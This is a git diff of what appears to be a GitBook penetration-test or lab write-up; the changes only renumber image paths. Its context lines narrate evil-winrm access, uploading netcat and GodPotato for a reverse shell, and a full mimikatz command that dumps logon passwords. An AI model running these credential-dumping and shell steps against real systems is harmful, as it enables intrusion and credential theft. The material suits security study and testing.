@@ -14,7 +14,7 @@ I start by connecting to the session via evil winrm and look at the double NIC:
 
 I quickly see me have&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So i upload netcat and godpotato to the machine and launch the command to get a reverse shell:
 
@@ -118,7 +118,7 @@ and i get my reverse shell:
 
 I can upload files, not with wget or certutil but the  put-file module on nxc, ILY nxc
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I try to privesc, to download the files in windows old, and all but no success so i upload mimikatz on the machine and try some stuff:
 
@@ -136,7 +136,7 @@ and after running mimikatz:
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 Authentication Id : 0 ; 441378 (00000000:0006bc22)                                                                  
